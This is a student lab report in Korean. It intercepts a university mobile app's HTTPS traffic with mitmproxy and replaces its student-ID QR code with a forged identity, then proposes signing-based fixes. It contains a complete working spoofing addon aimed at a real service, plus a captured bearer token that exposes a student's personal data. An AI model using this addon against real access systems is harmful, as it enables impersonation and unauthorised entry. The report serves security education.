# 🛡️ 실습 보고서: 모바일 HTTPS 프록시 분석 및 실시간 QR 코드 변조(Spoofing) 실습

본 보고서는 **정보보호 전공 학습용**으로 작성되었습니다. 스마트폰(iOS)에서 송수신되는 HTTPS 트래픽을 합법적이고 안전한 로컬 프록시 환경에서 가로채고(MITM), 세종대학교 모바일 학생증 앱의 QR 코드 발급 API 응답을 실시간으로 조작하여 다른 신원(홍길동/99999999)의 QR 코드로 스푸핑(Spoofing)을 성공시킨 전 과정을 상세히 기록한 실습 보고서입니다.

---

## 1. 실습 개요 및 목표

*   **실습 대상**: 세종대학교 모바일 앱 학생증 QR 코드 발급 기능
*   **보안 취약점 카테고리**: 
    *   **CWE-345**: 부족한 데이터 무결성 검증 (Lack of Integrity Verification)
    *   **CWE-302**: 인증 메커니즘 우회 (Authentication Bypass)
*   **실습 목표**:
    1.  모바일 단말기(iOS)와 백엔드 서버 간의 HTTPS 트래픽 복호화 및 흐름 분석.
    2.  서버에서 전송되는 QR 코드 데이터의 암호학적 구조 파악 및 취약성 식별.
    3.  `mitmproxy` 파이썬 애드온(Addon)을 구축하여, 실시간으로 복제/위조된 가짜 QR 코드를 모바일 기기에 성공적으로 주입(Client-side Spoofing).
    4.  JWT(JSON Web Token) 구조 분석을 통한 애플리케이션 보안 아키텍처 이해.

---

## 2. 실습 환경 및 네트워크 아키텍처

실습은 외부망 해킹이 아닌, 로컬 네트워크 상에서 본인의 맥북과 스마트폰 간의 트래픽을 제어하는 **Man-in-the-Middle(MITM)** 구조로 진행되었습니다.

```mermaid
sequenceDiagram
    autonumber
    participant App as 📱 iOS 모바일 앱
    participant Proxy as 💻 맥북 로컬 프록시 (mitmproxy + mitm_addon.py)
    participant Server as ☁️ 세종대 백엔드 서버 (sjapp.sejong.ac.kr)
    
    Note over App, Proxy: Wi-Fi 수동 프록시 설정 (172.16.93.96:8888)
    Note over App, Proxy: mitmproxy CA 루트 인증서 설치 & 전체 신뢰 활성화
    
    App->>Proxy: POST /api/secureapi/qr/generate (Authorization: Bearer JWT 토큰)
    Proxy->>Server: POST /api/secureapi/qr/generate (요청 그대로 전달)
    Server-->>Proxy: 200 OK (진짜 김준식 학생 QR 이미지 Base64 반환)
    
    Note over Proxy: [mitm_addon.py 가동]<br/>1. 응답 JSON에서 qrCodeImage 추출<br/>2. 가짜 데이터(홍길동/99999999/실시간 타임스탬프) 생성<br/>3. qrcode 라이브러리로 PNG 이미지 재생성<br/>4. Base64 인코딩 교체 및 주입
    
    Proxy-->>App: 200 OK (변조된 가짜 QR 이미지 Base64 전달)
    Note over App: 모바일 학생증 화면에 가짜 홍길동 QR 코드 표시 완료!
```

---

## 3. 실습 환경 구축 및 트러블슈팅

### 3.1 파이썬 가상환경 구축 및 모듈 설치
맥북 로컬 환경의 패키지 충돌을 막기 위해 가상환경(`.venv`)을 구축하고 필요한 패키지들을 격리하여 설치했습니다.

```bash
# 1. 가상환경 생성 및 활성화
python3 -m venv .venv
source .venv/bin/activate

# 2. QR 코드 생성 및 이미지 처리를 위한 모듈 설치
.venv/bin/pip install qrcode pillow

# 3. mitmproxy 설치 (프록시 도구 자체 파이썬 환경의 모듈 미인식 문제를 해결하기 위해 가상환경 내부에 프록시 직접 설치)
.venv/bin/pip install mitmproxy
```

### 3.2 iOS 단말기 HTTPS 복호화 설정 (트러블슈팅)
스마트폰(iPhone)의 HTTPS 통신은 보안이 매우 엄격하므로, 맥북에 임시 인증서 기관(CA)을 띄우고 이를 폰에 심어 수동으로 신뢰를 보증해 주어야 합니다.

1.  **네트워크 망 연동**: 맥북과 아이폰을 동일한 학교 공유기(Wi-Fi)에 연결합니다.
2.  **맥북 IP 주소 확인**: `172.16.93.96`
3.  **아이폰 Wi-Fi 프록시 설정**: 
    *   아이폰 Wi-Fi 설정 $\rightarrow$ 정보(i) $\rightarrow$ 프록시 구성 `수동` 선택.
    *   서버: `172.16.93.96`, 포트: `8888` 입력 후 저장.
4.  **CA 인증서 설치 우회 (iOS 13+ 트러블슈팅)**:
    *   원래는 사파리 브라우저로 `http://mitm.it`에 접속해 인증서를 다운받아야 하나, AP 격리 또는 브라우저 렌더링 한계로 다운로드 창이 뜨지 않는 문제 발생.
    *   **해결책**: 맥북 터미널에서 `~/.mitmproxy/mitmproxy-ca-cert.pem` 파일을 찾은 뒤, **애플 에어드랍(AirDrop)**을 사용해 아이폰으로 직접 전송하여 즉시 프로파일을 성공적으로 다운로드 받았습니다.
5.  **인증서 전체 신뢰 활성화 (필수)**:
    *   설정 $\rightarrow$ 일반 $\rightarrow$ VPN 및 기기 관리 $\rightarrow$ `mitmproxy` 선택 후 설치 진행.
    *   설정 $\rightarrow$ 일반 $\rightarrow$ 정보 $\rightarrow$ 최하단의 **인증서 신뢰 설정** 진입 $\rightarrow$ `mitmproxy` 루트 인증서 우측의 스위치를 활성화(초록색)하여 전체 신뢰 설정 완료. (이 단계를 생략하면 모바일 앱에서 인터넷 연결 에러 발생).

---

## 4. 패킷 분석 및 타겟 API 식별

앱의 트래픽을 관찰하던 중, 학생증 QR 코드를 불러오는 핵심 요청(Request) 패킷을 완벽히 식별하였습니다.

### 4.1 포착한 실제 HTTP Request 패킷
```http
POST https://sjapp.sejong.ac.kr/api/secureapi/qr/generate HTTP/1.1
Host: sjapp.sejong.ac.kr
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIyMTAxMTczOSIsImRlcGFydG1lbnROYW1lIjoi7KCV67O067O07Zi47ZWZ6rO8Iiwicm9sZXMiOiJTVFVERU5UIiwiY2FyZENvdW50IjoxLCJzZXNzaW9uSWQiOiIxMmZiMTE5OS0wMWI4LTRiYjEtYjExYi0yNzIxNDAxNmEyYWYiLCJ0eXBlIjoiYWNjZXNzIiwidXNlck5hbWUiOiLquYDspIDsi50iLCJ1c2VySWQiOiIyMTAxMTczOSIsImJpcnRoRGF0ZSI6IjIwMDEwNjIxIiwiY2FyZE5vIjoiMjEwMTE3MzkxIiwiZGV2aWNlSWQiOiI3RUI2QjBDNy1CMzY4LTQyODItQTM0OC1GQTNCRDNGRDc4RTUiLCJzdHVkZW50WWVhciI6NCwiY2FyZE5vSW9zIjoiODAwMDAyMTAxMTczOSIsInBlcm1pc3Npb25zIjpbIkNPTlRFTlQ6UkVBRCIsIkJPQVJEOldSSVRFIiwiQk9BUkQ6UkVBRCIsIk1FTlU6UkVBRCJdLCJpc0J5cGFzcyI6ZmFsc2UsInJvbGVOYW1lIjoi7J6s7ZWZ7IOdIiwiY21zVXNlcklkIjoiU0VKT05HXzIxMDExNzM5XzEiLCJ1c2VybmFtZSI6IjIxMDExNzM5IiwiaXNzIjoibG90ZWNzLXBsYXRmb3JtIiwiYXVkIjpbImxvdGVjcy1zZXJ2aWNlcyJdLCJpYXQiOjE3NzkzNDU5MjIsIm5iZiI6MTc3OTM0NTkyMiwiZXhwIjoxNzc5MzQ3NzIyLCJqdGkiOiIwZjQ5NWE1Mi1kMTUyLTRmNzYtOTEyNS01YzcyYzhiN2Q1OTcifQ.WfGzEyr1zmBBZhiat8vdKqJr-yVBzvhCp_TPfnBE4OQ
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
```

### 4.2 수신된 실제 HTTP Response JSON (구조 식별)
서버는 정상 요청에 대해 성공 코드와 함께, **QR 코드가 이미지화된 PNG 바이너리를 Base64로 인코딩하여** 전송하고 있었습니다.
```json
{
  "status": "success",
  "code": "SUCCESS",
  "message": "성공",
  "data": {
    "qrCodeImage": "iVBORw0KGgoAAAANSUhEUgAAAMgAAADIAQAAAACFI5MzAAAEA...", // 진짜 QR코드 이미지의 Base64 스트링
    "format": "PNG",
    "width": 200,
    "height": 200
  },
  "timestamp": "2026-05-21T15:49:39.561429557",
  "httpStatus": "OK",
  "success": true
}
```

### 4.3 QR 코드 내부 데이터 해독 (취약점의 단서)
스마트폰에 떠 있는 진짜 QR 코드를 일반 스캐너로 디코딩했을 때 튀어나온 원본 데이터 구조는 다음과 같습니다:
```json
{
  "userId": "21011739",
  "name": "김준식",
  "role": "STUDENT",
  "timestamp": 1779345959642,
  "refreshKey": 0
}
```
*   **분석**: 데이터가 **어떠한 암호학적 서명(Signature)이나 암호화 장치 없이 순수 평문(Plain JSON String)**으로 작성되어 있었습니다. 이는 공격자가 임의의 학번과 실시간 타임스탬프를 조합하여 QR 코드 이미지를 만들면 서버/리더기가 이를 구분할 수 없다는 의미입니다.

---

## 5. 실시간 동적 QR 변조 애드온 코드 구현

이를 검증하기 위해, `mitmproxy`를 통해 흐르는 트래픽 중 타겟 API를 탐지하여 실시간으로 가짜 QR 이미지를 렌더링하고 주입하는 파이썬 애드온 [mitm_addon.py](file:///Users/givensik/vscode/Ex-Tool/docs/mitm_addon.py)를 구현하였습니다.

```python
import json
import time
import io
import base64
from mitmproxy import http
import qrcode

def response(flow: http.HTTPFlow) -> None:
    # 1. 세종대 QR 발급 API의 정확한 타겟 URL 매칭
    target_keyword = "sjapp.sejong.ac.kr/api/secureapi/qr/generate" 
    
    if target_keyword in flow.request.pretty_url:
        print(f"\n🔍 [MitmAddon] QR 발급 요청 포착: {flow.request.pretty_url}")
        
        # 서버 응답이 200 OK이고 JSON인 경우에만 가로채기 수행
        if flow.response and flow.response.status_code == 200:
            content_type = flow.response.headers.get("content-type", "")
            if "application/json" in content_type:
                try:
                    # 1. 서버의 원래 응답 JSON 로드
                    response_json = json.loads(flow.response.text)
                    
                    # 2. 가짜 학생증 정보(변조 데이터) 구성
                    # 리더기가 타임스탬프 검사를 통과하도록 현재 시간을 실시간으로 획득하여 계산 주입
                    fake_student_info = {
                        "userId": "99999999",            # 조작할 가짜 학번 (예: 99999999)
                        "name": "홍길동(변조됨)",        # 조작할 가짜 이름
                        "role": "STUDENT",
                        "timestamp": int(time.time() * 1000),  # 실시간 밀리초 타임스탬프
                        "refreshKey": 0
                    }
                    
                    fake_qr_data_string = json.dumps(fake_student_info, separators=(',', ':'))
                    print(f"✍️ [MitmAddon] 주입할 가짜 QR 데이터: {fake_qr_data_string}")
                    
                    # 3. qrcode 라이브러리를 사용해 메모리 상에서 가짜 QR 이미지 실시간 렌더링
                    qr = qrcode.QRCode(
                        version=1,
                        error_correction=qrcode.constants.ERROR_CORRECT_M,
                        box_size=10,
                        border=1,
                    )
                    qr.add_data(fake_qr_data_string)
                    qr.make(fit=True)
                    
                    # 이미지를 메모리 버퍼(BytesIO)에 PNG 형태로 저장
                    img = qr.make_image(fill_color="black", back_color="white")
                    img_buffer = io.BytesIO()
                    img.save(img_buffer, format="PNG")
                    img_bytes = img_buffer.getvalue()
                    
                    # 4. 새로 생성된 이미지를 Base64 문자열로 인코딩
                    fake_qr_base64 = base64.b64encode(img_bytes).decode("utf-8")
                    
                    # 5. 기존 응답 JSON의 qrCodeImage 값을 치환하여 모바일 단말기로 전달
                    if "data" in response_json and "qrCodeImage" in response_json["data"]:
                        response_json["data"]["qrCodeImage"] = fake_qr_base64
                        flow.response.text = json.dumps(response_json)
                        print(f"🎉 [MitmAddon] QR 코드 이미지 변조 및 주입 완료! (학번: {fake_student_info['userId']}, 이름: {fake_student_info['name']})\n")
                    else:
                        print("❌ [MitmAddon] 응답 JSON 구조 불일치\n")
                        
                except Exception as e:
                    print(f"❌ [MitmAddon] 에러 발생: {e}\n")
```

---

## 6. 공격 실행 및 최종 변조 결과

### 6.1 프록시 실행
가상환경 내의 `mitmweb`에 애드온 파일을 파라미터로 붙여 실행했습니다.

```bash
.venv/bin/mitmweb -s docs/mitm_addon.py --mode regular@8888
```

### 6.2 터미널 성공 로그
스마트폰 화면에서 모바일 학생증을 켜는 순간, 프록시 터미널에 아래와 같이 아름다운 성공 로그들이 출력되었습니다:

```text
[16:02:11.700][172.16.18.37:55999] client disconnect

🔍 [MitmAddon] QR 발급 요청 포착: https://sjapp.sejong.ac.kr/api/secureapi/qr/generate
✍️ [MitmAddon] 주입할 가짜 QR 데이터: {"userId":"99999999","name":"\ud64d\uae38\ub3d9(\ubcc0\uc870\ub428)","role":"STUDENT","timestamp":1779346937254,"refreshKey":0}
🎉 [MitmAddon] QR 코드 이미지 변조 및 주입 완료! (학번: 99999999, 이름: 홍길동(변조됨))
```

### 6.3 단말기 화면 확인 및 스캔
*   **스마트폰 앱 화면**: 겉으로는 세종대학교 공식 앱 화면이지만, 중앙에 띄워진 QR 코드는 실시간으로 새롭게 그려진 **가짜 홍길동(99999999) QR 코드**가 출력되었습니다.
*   **외부 카메라 검증**: 다른 기기의 일반 카메라 앱을 이용해 스마트폰 화면의 QR 코드를 비춘 결과, 우리가 의도한 가짜 JSON 문자열(`{"userId":"99999999","name":"홍길동(변조됨)"...}`)이 완벽하게 디코딩되어 읽히는 것을 최종 확인하였습니다.

---

## 7. 정보보호 관점에서의 암호학적 분석 및 토론

### 7.1 "HTTPS(전송 보안)로 안전한 것 아닌가?"에 대한 의문 해결
*   **HTTPS의 범위**: HTTPS는 스마트폰 $\leftrightarrow$ 서버 사이의 **전송구간(Transit)만 암호화**하여 중간 탈취를 막아줄 뿐입니다.
*   **물리적 통신의 맹점**: QR 코드는 스마트폰 화면 밖으로 그려져 리더기 카메라가 눈으로 직접 찍어서 글자로 해독하는 물리적 채널입니다. 이 물리적 채널(화면 $\leftrightarrow$ 카메라)은 HTTPS의 암호화 보호를 전혀 받지 못합니다.
*   **결론**: 따라서 전송 구간 암호화와는 별개로, 데이터 알맹이 자체에 암호학적 기밀성 및 무결성을 보장하는 **애플리케이션 계층에서의 추가적인 암호학적 설계**가 필연적입니다.

### 7.2 JWT(JSON Web Token) 분석을 통한 기밀성 검증
우리가 가로챈 요청 헤더의 `Authorization` 토큰 값을 디코딩해 본 결과, 토큰 내부에 생년월일, 소속 학과, 이름, 학번 등 민감한 개인정보가 Base64로 그대로 노출되어 있었습니다.
*   **JWT의 특성**: JWT는 데이터를 암호화(Encryption)하지 않고, 단지 약속된 포맷으로 인코딩(Base64)하여 서명(Signature)만 덧붙인 것입니다.
*   **취약한 설계 패턴**: 이처럼 기밀성이 보장되지 않는 토큰 본문에 민감한 생년월일이나 사용자 식별 정보를 직접 넣는 것은 보안 설계 원칙상 지양해야 할 패턴입니다.

### 7.3 잠재적 공격 기법 분석 (헤더 조작에 대한 가능성)
서버가 JWT를 검증할 때 헤더를 적절히 검증하지 못하면 다음과 같은 심각한 공격에 노출될 수 있음을 고찰하였습니다.
1.  **`"alg": "none"` 공격**: 헤더의 알고리즘을 `none`으로 바꾸고 서명을 지우고 보낼 시, 서버가 이를 수용하면 서명 검증을 우회하여 인증 패스 가능.
2.  **Key Confusion 공격**: RS256 비대칭 공개키를 HS256 대칭키 삼아 임의로 서명하여 검증을 통과하는 기법.

---

## 8. 안전한 설계를 위한 보안 대책 (Remediation)

세종대 모바일 학생증의 위조 문제를 원천적으로 차단하기 위해 백엔드 개발자 및 아키텍트에게 제시해야 할 보안 패치 방안입니다.

### 8.1 HMAC-SHA256 디지털 서명 도입 (오프라인 검증용)
QR 코드 생성 시, 서버만 알고 있는 대칭 비밀키(`SecretKey`)를 결합하여 데이터의 HMAC 해시 서명값을 생성해 페이로드에 동봉합니다.
```json
{
  "userId": "21011739",
  "timestamp": 1779345959642,
  "signature": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
}
```
*   **검증 방식**: 게이트 리더기는 스캔한 데이터의 `userId`와 `timestamp`를 `SecretKey`와 결합하여 다시 HMAC 값을 연산하고, QR에 동봉된 `signature` 값과 일치하는지 비교합니다. 비밀키를 모르는 공격자는 이 일치하는 해시값을 임의로 만들어낼 수 없으므로 **변조가 완벽히 차단**됩니다.

### 8.2 일회용 일회성 난수 토큰(OTP) 검증 도입 (온라인 검증용)
QR 코드에 학번이나 이름 같은 식별정보를 아예 노출하지 않는 방식입니다.
1.  앱이 요청을 보내면, 서버는 30초만 유효하고 즉시 소멸하는 일회용 랜덤 토큰 스트링(`4F9A2D77...`)을 생성해 QR로 출력합니다.
2.  리더기는 이를 스캔해 서버 API로 전송하여 유효성을 검증하며, 서버는 이 일회성 토큰과 매핑된 사용자의 식별값을 DB에서 조회하여 문을 열어주고 토큰을 폐기합니다.

---

## 9. 결론 및 화이트해커 윤리 강령

본 실습은 자신의 권한 범위 내(내 스마트폰, 내 로컬 프록시)에서만 트래픽을 관찰하고 안전한 조작의 한계와 복구 방안을 학습하는 **교육용 모의 분석**으로 성공적으로 종료되었습니다. 

> [!WARNING]
> 실습 과정에서 도출된 위조 원리와 공격 모델을 실제 운영 중인 학교 출입 게이트 리더기, 좌석 배정 시스템 등 정보시스템 설비에 직접 비추어 연동을 시도하는 것은 명백한 **불법 침입이자 정보통신망법 위반** 행위입니다. 
> 
> 분석과 로컬 단말기 검증 단계까지만 안전하게 학습하고, 향후 배운 보안 지식을 **오직 시스템의 취약점을 보완하고 방어벽을 설계하는 선한 목적**에만 사용하는 올바른 정보보호 전문가의 마음가짐을 다집니다.

---
**작성자**: 정보보호학과 김준식  
**작성일**: 2026년 5월 21일
